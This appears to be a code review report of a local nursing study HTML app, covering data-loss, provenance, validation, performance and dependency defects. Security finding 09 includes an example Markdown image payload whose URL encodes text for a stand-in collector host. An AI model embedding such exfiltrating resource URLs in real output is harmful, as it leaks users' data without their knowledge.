# Production code review — 2026-09-11

**Release reviewed:** v15.17, commit `549ee927c2d362e01facbc5741ee8df9c48112df`. The tracked working tree was clean when reviewed.

**Disposition:** Do not treat the current release as production-ready until the high-priority data-loss and provenance defects are resolved. **20 actionable findings: 0 Critical, 7 High, 10 Medium, 3 Low.** Severity is assessed for the intended local, single-user nursing study application, not a hosted multi-tenant clinical service.

The review covered the shipped HTML's six tools and shared runtime, repository verifier and regression harness, tracked tooling and manual measurement scripts, dependency declarations, and routed project documentation. Three independent review passes covered security, correctness, and performance/tooling. Historical proposals were treated as unapproved records. Ignored course files, private KBs, photos, and transcripts were not inspected.

**Validation performed:** `node verify-repo.js` passed: 904 deterministic assertions, 11 frozen prompt hashes, generated prompt documentation, canonical-file/LF/version checks, and full React JSX Babel transformation. Additional synthetic probes executed extracted live functions and asynchronous closures with mocked dependencies. No live Gemini calls, real Anki import, or full browser acceptance run was performed. Security issue 09 is supported by code flow and primary documentation; its attempted browser reproduction did not complete. Performance figures are local synthetic Node measurements, not user-device/browser measurements.

**Changes made:** This report and ignored review probes only. Application behavior, prompt bytes, baseline, tests, dependencies, and release metadata remain unchanged. No commit or release was made. The requested aggressive cleanup is represented as bounded recommendations because mixing fixes into this review would obscure the reproduced baseline and several validation changes need focused regression work.

Root review probes are available at [offline reproduction script](<scratch/review-2026-09-11/repro.js>). Run from the repository root with `node scratch/review-2026-09-11/repro.js`. It characterizes present failures; it is not a substitute for passing regression assertions after fixes. Other race/merge/benchmark reproductions were run independently by the review agents with synthetic inputs.

## 01. Unicode normalization deletes distinct clinical facts

**Severity:** High  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:1437>) — kbFactKey / mergeLatteParts

**Problem:** Deduplication removes characters outside a narrow ASCII-oriented allowlist. Greek letters, the micro sign, and Unicode minus are lost.

**Impact:** Different statements collapse into one fact. The first text survives and inherits both source pointers, losing content and misrepresenting supporting sources.

**Evidence:** Extracted live functions merged each synthetic pair into one survivor: `10 μg` versus `10 g`; `α receptors` versus `β receptors`; `−5 mmol/L` versus `5 mmol/L`. Both filenames remained on the survivor.

**Recommendation:** Use conservative Unicode-preserving equality. Normalize whitespace; retain letters, signs, units, and meaningful case unless a specific equivalence has evidence. Revisit the similarly lossy condition-name matching in mergeLatteParts. Existing KBs cannot recover deleted facts automatically: retain exports and rebuild affected material after the fix.

**Regression coverage:** Distinct Greek letters, both micro characters, ASCII/Unicode minus, unit case, and genuinely equivalent whitespace. Assert surviving text and source association, not only record counts.

**Expected benefit:** Correctness and maintainability; prevents irreversible content loss.

## 02. Case numeric validation accepts unsupported values

**Severity:** High  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:6913>) — caseAuditTextValues / CASE_CLINICAL_TOKEN_RE / caseUnitsCompatible

**Problem:** Support is checked with substring inclusion after normalization. Compound units are truncated by tokenization. The model-supplied `neutral-framing` label returns before numeric checking.

**Impact:** Fabricated or differently scaled values can pass a validator presented as a source-grounding boundary.

**Evidence:** Live-function probes returned no issues for `5 mg` supported only by `15 mg`, and `30 mL/hr` supported only by `30 mL/day`. A synthetic `900 mg` datum labeled neutral-framing also bypassed this check against unrelated text.

**Recommendation:** Compare complete parsed value-and-unit tokens with boundaries. Preserve compound-unit denominators; map only explicitly equivalent units. Check whether a claimed neutral detail contains clinical values before exempting it. Reuse tested normalization primitives where their semantics match, but preserve the case-specific threshold/instantiation policy. Do not claim this establishes clinical entailment.

**Regression coverage:** Prefix-number collisions; compound-unit mismatches; decimals and grouped numbers; unsupported units; neutral-framing with clinical values; existing valid instantiations. Keep existing qualitative warning tiers intact.

**Expected benefit:** Correctness, trustworthy validation, and maintainability.

## 03. Old artifacts resolve against a different knowledge base

**Severity:** High  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:1103>) — FactInspectorDrawer / App.registerArtifact / NCLEXGenerator / CaseStudyGenerator

**Problem:** The inspector resolves fact IDs from the live KB. NCLEX and case artifacts and registry entries do not capture a KB identity. Replacement can reuse `fact-1` for a different statement; requests already in flight can later register old IDs. Registration is at lines 6272 and 7876; the shared registry writer is at 8280.

**Impact:** A source badge can display unrelated evidence as if it supported the old question. Existing registry usage also survives KB replacement. The README's stale-reference promise is not implemented for these paths.

**Evidence:** Static data-flow confirmation: the drawer takes only an ID and K.factIndex; both generators publish IDs without a source revision; App replaces the KB without invalidating these registry kinds. Anki already has a source-snapshot/currentness mechanism, demonstrating a local pattern to reuse.

**Recommendation:** Capture source identity with every artifact and registration. Reject late registration for a superseded KB; partition or invalidate registry entries on replacement. Resolve old badges against captured snapshots or display an explicit stale state. Mark stale exported material with its original source identity.

**Regression coverage:** Generate against KB A, replace with KB B reusing fact IDs, then inspect/export A. Repeat with A's response pending during replacement. Verify that unrelated artifact kinds remain intact.

**Expected benefit:** Correctness and maintainability; restores trustworthy provenance.

## 04. Persistence recovery can overwrite newer saved work

**Severity:** High  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:8237>) — App initialization, hydration effect, and persistence effect

**Problem:** A failed IndexedDB save writes fallback A to localStorage. A later successful IndexedDB save B does not remove A. Reload initializes from A; hydration rejects B because current state already has conditions, then removes the fallback.

**Impact:** The stale A becomes active and the normal save effect can overwrite newer B. A successful save therefore does not ensure the most recent KB survives reload.

**Evidence:** Extracted initializer/hydration replay with IndexedDB B and localStorage A loaded A and reported ready. The failure and successful-save branches at lines 8254–8257 produce this reachable store disagreement.

**Recommendation:** Clear obsolete fallback after a successful IndexedDB commit. Distinguish an actual in-session replacement from startup fallback using a mutation revision. Reconcile stores using explicit persisted revisions; do not delete a conflicting copy before determining which data should survive.

**Regression coverage:** IDB failure saving A → successful B → reload; import during pending hydration; quota/storage failure; conflicting legacy stores; transaction abort.

**Expected benefit:** Data durability, predictable recovery, and maintainability.

## 05. An older build overwrites a completed import

**Severity:** High  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:2502>) — KnowledgeBaseBuilder.build / importJSON

**Problem:** Build publishes its result unconditionally after asynchronous work. Import JSON remains enabled during the build at line 2668 and does not invalidate the older operation.

**Impact:** The user's later imported KB is silently replaced and persisted over. The build's original replacement confirmation did not cover this newer state.

**Evidence:** Extracted-build replay paused a mocked generation, imported KB B, then resolved the older build C. Final active KB was C.

**Recommendation:** Give build and import a common monotonic replacement revision. Import invalidates or aborts earlier builds; only the owner of the current revision may publish. A temporary UI interlock is a smaller mitigation, but the publication guard should remain the actual boundary.

**Regression coverage:** Deferred build → successful import → late build completion; failed import; cancellation immediately before commit.

**Expected benefit:** Data preservation, correctness, and maintainability.

## 06. Removed photos return through pending transcription

**Severity:** High  
**Category:** Regression  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:2281>) — KnowledgeBaseBuilder.transcribeCards / removal handler / cardChunks

**Problem:** Transcription captures a copy of all transcripts and republishes it after awaits. Removing a photo edits current state but does not invalidate that captured copy. Buildable card chunks are derived from all stored transcripts, not the current source IDs.

**Impact:** A removed image can still contribute facts to the next KB. This violates the v15.14 source-removal guarantee; with a remaining PDF, the obsolete transcript may be used while the image-review panel is absent.

**Evidence:** Extracted asynchronous replay left `retained.pdf` as the only file, but `removed.jpg` reappeared in transcript state when its delayed transcription resolved.

**Recommendation:** Publish only transcripts whose IDs still exist in a current-file ref, and invalidate obsolete transcription runs. Independently intersect buildable transcripts with current file IDs so stale state cannot become source material.

**Regression coverage:** Remove the pending photo; remove a previously completed photo while another is pending; remove the final photo while keeping a PDF; verify no stale transcript reaches the build queue.

**Expected benefit:** Correct source selection, provenance, and maintainability.

## 07. Malformed generated questions pass deterministic validation

**Severity:** High  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:5735>) — validateNCLEXWorksheet / validateCaseStudy (line 7112)

**Problem:** The worksheet validator accepts any nonempty ANSWER and does not verify concept references or stable IDs against the supplied packet. The case validator does not require a usable stem/options/rationales for an MCQ and does not verify the requested stage/question counts.

**Impact:** Structurally unusable or ungrounded items can be exported and registered despite a clean deterministic result. The optional model audit is not a replacement for local contract checks.

**Evidence:** A synthetic worksheet with four A–D options, `ANSWER: Z`, and rationale references to undeclared C99 produced zero issues. A case MCQ with no stem, options, or rationales produced only difficulty warnings and zero errors.

**Recommendation:** Add a small local structural parser/validator before publishing model output. Validate required containers/types, unique labels, type-specific answer membership/cardinality, expected counts, and resolvable concept-to-packet IDs. Preserve existing warn-tier style and Test Plan checks. Structured API output can later reduce malformed responses, but local semantic checks are still required.

**Regression coverage:** Invalid/multiple/missing MCQ answers; duplicate option/question IDs; missing required content; unresolved C IDs; out-of-packet stable IDs; short cases; malformed arrays; valid Calculation/Ordering exceptions.

**Expected benefit:** Correctness, robust error handling, and maintainability.

## 08. Exports lose known item-audit failures

**Severity:** Medium  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:6298>) — NCLEXGenerator.wsMd / CaseStudyGenerator.casePrintMd (line 7909) / caseValidationStamp

**Problem:** Export stamps use deterministic issues only. Stored item-audit FAIL/ERROR/REVIEW and incomplete-audit status are not incorporated. In cases, caseMd names the auditor but does not include its verdict rows either.

**Impact:** An item explicitly flagged for answer accuracy can leave the app as an ordinary worksheet or case with no warning. The source registry also gates only on deterministic errors; its meaning should be distinguished from item quality.

**Evidence:** Static export data flow: caseValidationStamp returns an empty string when deterministic errors are absent; callers pass no audit results. NCLEX workMd contains separate audit rows, while the normal worksheet export omits them.

**Recommendation:** Carry audit completion and unresolved verdicts into an export metadata notice, separate from the student questions so answers remain hidden. Preserve the existing ability to inspect/export failed material. Do not promote advisory validators or treat REPAIRED as re-audited.

**Regression coverage:** Deterministic pass plus accuracy FAIL; quota-stopped audit; repaired but not re-audited; audit disabled; completed pass. Verify MD/TXT/print all retain the correct status.

**Expected benefit:** Correctness and transparency of shared/exported study material.

## 09. Sanitized content can load arbitrary remote resources

**Severity:** Medium  
**Category:** Security  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:489>) — mdToSafeHtml / CSP at line 31 / buildPrintDoc

**Problem:** Default DOMPurify permits external-resource URLs and CSS. The CSP has neither img-src nor default-src. Imported facts and generated Markdown flow into this sanitizer. The CSP comment incorrectly states that images/styles are not exfiltration paths.

**Impact:** An imported KB or prompt-injected response can cause tracking requests or disclose text encoded into an image/CSS URL without executing JavaScript. Output styles can also affect the surrounding UI.

**Evidence:** Static path plus the vendor's documented threat model. Example input: `![x](https://example.invalid/collect?course=SYNTHETIC)`. No completed browser network reproduction, no demonstrated API-key disclosure, and no sanitizer-XSS exploit are claimed. [DOMPurify threat model](https://github.com/cure53/DOMPurify/wiki/Security-Goals-%26-Threat-Model).

**Recommendation:** Use a narrow output allowlist; forbid output-provided styles and automatically loaded media unless explicitly needed. Set an img-src policy compatible with local card previews, and apply the same output policy to print documents. Keep trusted application styling separate.

**Regression coverage:** Intercept all requests in a synthetic browser fixture for Markdown images, CSS URLs, SVG/media variants, and print exports. Require zero unapproved requests and working local previews.

**Expected benefit:** Security and reduced unexpected network activity.

## 10. Anki deduplication discards Extra and priority

**Severity:** Medium  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:3852>) — ankiDedupeCards

**Problem:** Only normalized Text participates in note identity. Different Extra and Tags are discarded, while fact IDs from both notes are unioned into the first.

**Impact:** Source-supported explanations disappear. An earlier Tier 3 note can eliminate a later Tier 1 note from Tier 1 export while coverage still claims the discarded note's facts.

**Evidence:** Two identical Text fields with distinct Extra, Tier::3 versus Tier::1, and fact-1 versus fact-2 became one Tier 3 note with the first Extra and both IDs. Tier 1 export contained no note.

**Recommendation:** Automatically dedupe only completely equivalent notes, including Extra and effective tags. Retain meaningful variants and use the existing collision warnings for review. Union evidence only after equivalence is established.

**Regression coverage:** Equal Text/different Extra; different tiers; meaningful case differences; wholly identical notes with additional valid source links. Check exported content and coverage together.

**Expected benefit:** Content retention, accurate priority/coverage, and maintainability.

## 11. Card identity disagreements are ignored

**Severity:** Medium  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:2163>) — cardCompareRuns / cardUnstable at line 2317 / cardChunkBlockers

**Problem:** facesDisagree and idsDisagree are calculated but never consumed. The gate considers only differing bullets and numeric entries, then uses runs[0].

**Impact:** Two runs can disagree on card number/category/front-versus-back and still look stable. Pairing can attach content to the wrong condition/card.

**Evidence:** Extracted helpers returned facesDisagree:true and idsDisagree:true with empty unstable bullets/numerics and zero blockers.

**Recommendation:** Surface structural identity disagreement and require resolution before using the pairing, consistent with existing back-only/duplicate-face handling. Preserve all individual run evidence. This is a proposed new structural check, not authorization to elevate unrelated warning tiers.

**Regression coverage:** Same text/numbers with different face, number, or category; legitimate matching pair; incomplete second run.

**Expected benefit:** Correct source attribution and maintainability.

## 12. Incomplete SSE output is returned as successful

**Severity:** Medium  
**Category:** API  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:675>) — geminiRequest streaming path

**Problem:** Malformed JSON events are silently ignored and EOF is accepted whenever text exists, even if no final candidate finishReason was received.

**Impact:** An interrupted or damaged stream can be treated as complete; metadata reports truncated:false. Plain-text consumers can publish partial artifacts without a truncation notice.

**Evidence:** A mocked stream with one text event and ordinary EOF, but no finishReason, returned `partial output` and `{finishReason:null,truncated:false}`. This executed the shipped transport, without any network request.

**Recommendation:** Track stream completion explicitly. Treat malformed nonempty events and missing terminal metadata as incomplete/protocol errors, preserving partial text separately. Release/cancel the reader in a finally path and reset accumulated preview when retrying. Keep each retry attempt's output distinct.

**Regression coverage:** Split UTF-8 and SSE frames; malformed event; EOF without finish; midstream reader rejection; retry after partial output; abort during backoff; valid STOP; MAX_TOKENS and safety blocks.

**Expected benefit:** Reliability, clearer error handling, and reduced misleading output.

## 13. Priority analysis becomes reentrant while streaming

**Severity:** Medium  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:3076>) — PriorityAnalyzer.runAnalysis / Analyze button at line 3121

**Problem:** The first synthesis update changes step from processing to results. The run button disables only for processing, so another analysis can start before the first completes. There is no active-run identity guard.

**Impact:** Concurrent calls spend quota and race to overwrite output, progress, and abort-controller state. An older result can replace the user's newer analysis.

**Evidence:** Extracted-function replay started a second analysis during streaming, finished the newer one first, then resolved the older one. Final output was `old run` and the button had been enabled during the first stream.

**Recommendation:** Use a separate busy state/ref through the full operation and a run token for every state publication. Reset/New should invalidate or abort the old run; the active controller should belong to the current token.

**Regression coverage:** Reentry during streaming; New during streaming; out-of-order completions; cancelling the newer operation while the older one completes.

**Expected benefit:** Correctness, latency/spend control, and maintainability.

## 14. Collision warnings create quadratic DOM work

**Severity:** Medium  
**Category:** Performance  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:4056>) — AnkiCollisionWarnings / AnkiGenerator at line 4359

**Problem:** Every member note renders its entire collision group. Closed details elements still instantiate their descendants. N notes with one shared masked front produce N² diagnostic rows.

**Impact:** A large ambiguous group can stall results rendering and editing and consume excessive memory; hiding a tool does not unmount it.

**Evidence:** Shipped collision helpers with distinct answers sharing one masked front imply 100 notes → 10,000 member rows; 315 → 99,225; 1,000 → 1,000,000. These are structural row counts, not browser timing measurements.

**Recommendation:** Render each full group once in a batch panel. Show a short per-note link/reference, or lazily mount details on expansion. Preserve all warnings and selection rules.

**Regression coverage:** One large group and many small groups; assert member-render count grows linearly and every affected note remains discoverable.

**Expected benefit:** Performance, memory, and interaction latency.

## 15. Every Anki edit repeats immutable batch analysis

**Severity:** Medium  
**Category:** Performance  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:4005>) — ankiBatchDiagnostics / AnkiGenerator derived state at lines 4118–4129

**Problem:** Every cards change rechecks original rawCards for numeric/style/structural/collision findings despite immutable batch evidence. Current numeric and selection work is also repeated.

**Impact:** Typing or checking a note performs whole-batch work on the UI thread before React rendering.

**Evidence:** Offline Node benchmark of representative shipped derived-state helpers, excluding React/DOM: 315 notes ~22–49 ms; 1,000 ~52–74 ms; 3,000 ~170–206 ms. These synthetic timings indicate cost, not a measured browser SLA.

**Recommendation:** Separate original-response diagnostics from live selection totals. Memoize original findings on batch/currentness, reuse existing current summaries, cache snapshot numeric tokens, and avoid re-auditing unchanged card objects. Measure browser input latency before adding pagination or more abstractions.

**Regression coverage:** An edit recomputes current findings but not raw evidence; KB replacement still invalidates currentness; diagnostics stay byte/meaning equivalent. Benchmark identical fixtures before/after.

**Expected benefit:** Performance, fewer allocations, memory, latency, and maintainability.

## 16. Failed transcription measurements print a success conclusion

**Severity:** Medium  
**Category:** Testing  
**Location:** [davis-transcribe-test.js](<davis-transcribe-test.js:187>) — main comparison loop and summary at line 235

**Problem:** anyNumericDrift stays false unless an image has at least two successful runs. Zero successes or one success per image still produces the final no-drift success message.

**Impact:** A failed or incomplete measurement can be mistaken for evidence that a transcription configuration is reliable. Per-image errors do not repair the false aggregate conclusion.

**Evidence:** The summary reads only anyNumericDrift; comparable-run counts are not part of the decision. No live measurement was run.

**Recommendation:** Track requested/comparable/incomplete images and report inconclusive unless the required comparisons completed. Validate --runs as a finite positive integer and return a distinct nonzero status for incomplete measurements.

**Regression coverage:** Mock zero successes, one success, mixed completion, full agreement, and actual drift. Ensure no quota-consuming call is made by ordinary tests.

**Expected benefit:** Trustworthy testing, observability, and maintainability.

## 17. Default transcription measurement differs from the app

**Severity:** Medium  
**Category:** Testing  
**Location:** [davis-transcribe-test.js](<davis-transcribe-test.js:59>) — MODEL / transcribe at line 113

**Problem:** The CLI defaults to gemini-3.7-flash; the application defaults to gemini-3.8-flash. The CLI submits original image bytes, while cardFilePayload conditionally resizes/reencodes them.

**Impact:** Passing CLI results do not validate the shipped model/payload configuration, especially the full-resolution photo path still awaiting measurement.

**Evidence:** Compared CLI request construction to App line 8216 and cardFilePayload lines 1974–1995. No live API calls were made.

**Recommendation:** Record model, prompt hash, and payload metadata with every measurement. Resolve an explicit app-matching model, label original-image tests as a separate baseline, and use a bounded browser measurement to validate the actual resize/transcribe path. Do not introduce a native image dependency merely to mimic canvas.

**Regression coverage:** Offline configuration/payload-contract assertions. Actual card measurements still require authorization for that material and those calls, with two runs per card when changing transcription behavior.

**Expected benefit:** Reproducibility and prevention of misleading release evidence.

## 18. Multiple Anki tier tags pass structural lint

**Severity:** Low  
**Category:** Bug  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:3903>) — lintAnkiCard / tier selection

**Problem:** The tier check tests only whether any Tier::1–3 exists, despite the exactly-one-tier contract.

**Impact:** A note with Tier::1 Tier::3 can appear in multiple tier exports and gives ambiguous priority.

**Evidence:** Extracted lint accepted a structurally valid synthetic note with both tier tags and returned no issues.

**Recommendation:** Parse complete tier tags once, require exactly one effective tier, and reuse that parsed result for badges, counts, and exports. Preserve the editable note so the user can repair it.

**Regression coverage:** No tier; one tier; multiple distinct tiers; repeated tags; lookalike substrings; preview/export agreement.

**Expected benefit:** Correctness and maintainability.

## 19. Parser and sanitizer dependencies need a bounded refresh

**Severity:** Low  
**Category:** Maintainability  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:70>) — CDN declarations / getPdfDoc

**Problem:** PDF.js 3.11.174 is on an unsupported branch. DOMPurify is pinned to 3.4.12 although 3.4.15 is available.

**Impact:** Maintenance fixes do not reach the distributed artifact. This is dependency maintenance exposure, not a demonstrated active exploit in the configured paths.

**Evidence:** Primary sources: [PDF.js maintainer discussion](https://github.com/mozilla/pdf.js/discussions/18168) and [DOMPurify 3.4.15 release](https://github.com/cure53/DOMPurify/releases/tag/3.4.15). The app already uses the vendor workaround for [CVE-2024-4367](https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq): isEvalSupported:false.

**Recommendation:** Refresh DOMPurify and both fallback pins with sanitizer/print tests. Plan a supervised PDF.js ESM loading migration within the single HTML, preserving worker configuration and text-layout behavior. Retain isEvalSupported:false. Avoid React/Babel major upgrades without a concrete measured benefit or applicable fix.

**Regression coverage:** Verify every SRI pin on release; test both sanitizer CDN paths, local-file startup, PDF worker loading, spacing/page ranges/cancellation, and print. Do not infer a new vulnerability merely from version age.

**Expected benefit:** Security maintenance and maintainability.

## 20. Dead helpers and an unused document set add misleading code

**Severity:** Low  
**Category:** Maintainability  
**Location:** [Nursing-Study-Suite v15.17.html](<Nursing-Study-Suite v15.17.html:781>) — _pdfLiveDocs; kbAllFacts at 3813; nclexDedup at 4423; CLI flag helper

**Problem:** _pdfLiveDocs is written but never enumerated. kbAllFacts has no production caller. nclexDedup is tested but production uses nclexAccumulate. davis-transcribe-test.js line 57 declares an unused flag helper.

**Impact:** Stale comments describe cleanup that no longer exists; tests can exercise an unused wrapper rather than the production path. The set retains unnecessary references.

**Evidence:** Tracked-code reference searches and inspection of production call sites. No application dependency was shown to be removable.

**Recommendation:** Remove unused helpers and the inert set, or implement a genuinely needed owner cleanup mechanism if independently justified. Move equivalent dedup assertions to the live accumulator before removing its unused wrapper; preserve extraction-tail coverage and the enforced assertion total. Retain the casesAudit profile migration.

**Regression coverage:** Run the unified verifier after cleanup and verify the production accumulator still covers duplicate/distinct inputs. Check PDF release behavior independently.

**Expected benefit:** Readability, maintainability, and small code/reference reductions.

## Final assessment

| Area | Score / 100 | Basis |
|---|---:|---|
| Production readiness | 55 | Silent KB rollback/replacement and misleading evidence remain possible. |
| Maintainability | 60 | Large stateful components and fragile extraction anchors; shared helpers exist, but lifecycle rules differ across tools. |
| Security | 68 | No confirmed critical exploit; output resource policy permits information disclosure, and parser maintenance needs attention. |
| Performance | 60 | Quadratic collision rendering and repeated whole-batch analysis; synthetic helper timings only. |

These are engineering judgments for prioritization, not calibrated security certifications or benchmark scores.

**Critical issues:** None established. This does not prove their absence.

**High-priority issues:** Findings 01–07: destructive Unicode deduplication; false numeric support; stale source attribution; persistence rollback; build/import overwrite; removed-photo resurrection; incomplete deterministic output validation.

**Performance improvements:** Findings 14–15 remove N² diagnostic rendering and repeated immutable analysis. Expected improvement is structural and testable; no numerical speedup is claimed before implementation. Keep bounded audit concurrency and cancellation. Do not increase parallel Gemini calls blindly on a shared quota.

**Security improvements:** Restrict sanitized output to required markup, prevent automatic external resources, carry the policy into print, and refresh supported dependency pins. The current DOMPurify configuration is an XSS sanitizer, not a complete CSS/network policy.

**Technical debt removed:** None in this review. Proposed removals are identified in finding 20; their benefit is small compared with fixing lifecycle and source-integrity defects.

**Dead code removed:** None. Candidates: kbAllFacts, unused nclexDedup wrapper after transferring assertions, unused CLI flag, and the inert _pdfLiveDocs bookkeeping.

**Dependencies removable:** None demonstrated. React, ReactDOM, Babel, marked, DOMPurify, PDF.js, and JSZip have active uses. Keep the single-file/no-build contract. Do not remove compatibility behavior simply because it is old.

## Gemini and browser API assessment

- The application already targets **gemini-3.8-flash**, currently a stable model in Google's catalog. **gemini-3.1-pro-preview** is still listed as preview, with no shutdown date announced. Keep Flash as the stable path; do not invent a stable Pro alias or silently change the measured Pro profile. [Google model catalog](https://ai.google.dev/gemini-api/docs/models), [deprecation schedule](https://ai.google.dev/gemini-api/docs/deprecations).
- Direct REST **generateContent / streamGenerateContent** remain documented. This code has no Gemini SDK to deprecate or replace, and no function/tool-calling workflow needing migration. Do not switch to Interactions solely because it is newer. The concrete transport work is finding 12. [GenerateContent API reference](https://ai.google.dev/api/generate-content).
- Structured JSON outputs can reduce shape failures for extraction, repair, and case paths, but cannot validate answer correctness or source entailment. Introduce schemas per operation after the local validator exists and only with a bounded authorized real-batch measurement, as CURRENT_STATE requires. Markdown/Anki paths need their existing formats. [Structured output documentation](https://ai.google.dev/gemini-api/docs/structured-output).
- Keep the 65,536-token ceiling and model/profile behavior pending evidence. A lower ceiling is not itself a token-saving strategy. Reuse allocated fact slices and bounded context; measure actual usage/retries before changing caching or payloads. Export attempt counts, finish reason, usage, and audit completion without credentials or automatic content uploads.
- Preserve the existing RetryInfo-aware backoff and abortable delay. If retry handling is refactored, retain HTTP status and quota metadata in typed errors so outer batch loops can stop on permanent/auth/daily-quota failures instead of restarting identical unsuccessful calls. Test this offline before changing retry budgets.
- **document.execCommand('copy') is deprecated**, but the app already tries the Clipboard API first and uses it for compatibility. Keep the fallback until a tested manual-selection alternative preserves local-file behavior. [MDN execCommand](https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand).
- Keep the saved `casesAudit → itemAudit` profile migration: it protects users who have not reopened/resaved older settings. Removing it would be a backward-compatibility regression.

## Architecture and security boundaries

The meaningful architectural changes fit inside the existing HTML: one source-revision contract; one active-run/publication pattern; explicit artifact provenance; a shared parsed validation result used by UI/export/registry; and a serialized, revision-aware persistence path. These reduce duplicated lifecycle logic without a backend, bundler, new runtime dependency, or module split.

Large functions mix prompt assembly, network calls, state publication, validation, and presentation. Extract small pure helpers only where they remove duplicate logic or enable a specific failure test. A framework migration, elaborate service layer, or complete rewrite would impose maintenance and regression costs without addressing the demonstrated failures faster.

Authentication, authorization, CSRF, SSRF, replay protection, privilege escalation, and server-side rate limiting do not have the usual server surface in this local BYOK application. Review found no demonstrated OS command-injection or filesystem traversal exploit in the browser ZIP reader. This is not an assertion that hosted deployment would inherit those properties. Client resource loading, API-key handling, local persistence, untrusted documents, and quota resilience are the relevant boundaries here. SessionStorage key use and BLOCK_NONE remain deliberate project decisions. No committed secret or active PDF.js CVE-2024-4367 exploit was established in reviewed code.

## Ordered implementation plan

1. **Preserve data before repair (04–06).** Add fallback/IDB revisions and mutation ownership, then guard build/import and transcription publication. Regression tests must prove old async work cannot replace or reintroduce newer/removed data. Preserve legacy store copies during migration conflicts.
2. **Repair the fact/evidence boundary (01–03).** Preserve Unicode in identity, compare full numeric tokens, and bind artifacts/registry/inspector to source identity. Rebuild affected KBs only from explicitly scoped material; previously merged content cannot be reconstructed from the damaged KB alone.
3. **Complete deterministic contracts (07, 10, 11, 18).** Validate local output shapes, answer/concept references, note equivalence, tier count, and card identity. Retain invalid artifacts for repair. Keep existing warning tiers; any proposed promotion must follow the explicit-approval rule.
4. **Preserve audit truth in exports (08).** Add completed/incomplete/failed/repaired metadata consistently to worksheet, case, text, and print outputs without placing answers in the question section.
5. **Close output resource leakage (09).** Apply a constrained sanitizer and explicit media policy to UI and print. Run browser request-interception tests on synthetic material, including local card previews.
6. **Harden request lifecycle (12–13).** Reject incomplete SSE, manage readers, preserve partial diagnostics, isolate retry attempts, and prevent Priority Analyzer reentry. Extend existing run ownership to other generation tools where useful.
7. **Remove measured UI waste (14–15).** Render collision groups once and cache immutable diagnostics. Compare the same synthetic inputs before/after, then measure actual browser edit/render latency.
8. **Make measurement tools honest (16–17).** Fix inconclusive outcomes and record the actual model/payload configuration. Keep all live Gemini tools outside the ordinary verifier. Request only the bounded live runs needed for changed generation/transcription paths after offline verification.
9. **Refresh dependencies and remove dead code (19–20).** Update sanitizer pins, schedule the separate PDF.js migration, and remove proven unused helpers. Preserve compatibility shims with active users and transfer meaningful test coverage before deleting wrappers.
10. **Release only after verification.** Add non-vacuous live-function regressions for changed behavior, run `node verify-repo.js`, exercise browser storage/races/exports with synthetic data, perform an actual Anki import/review, and complete any required authorized live measurements. A release bump must update filename/comment/changelog/generated documentation and verify all SRI pins. Do not refresh prompt-baseline.json to conceal a mismatch.

Each step should be a small reversible change. No recommendation requires editing the 11 frozen prompts; any later prompt proposal requires its own exact diff and approval. New validation can reject formerly accepted malformed outputs, source-revision handling intentionally marks old artifacts stale, and conservative Anki dedupe may retain more notes. Those are the principal behavior/migration changes to document.
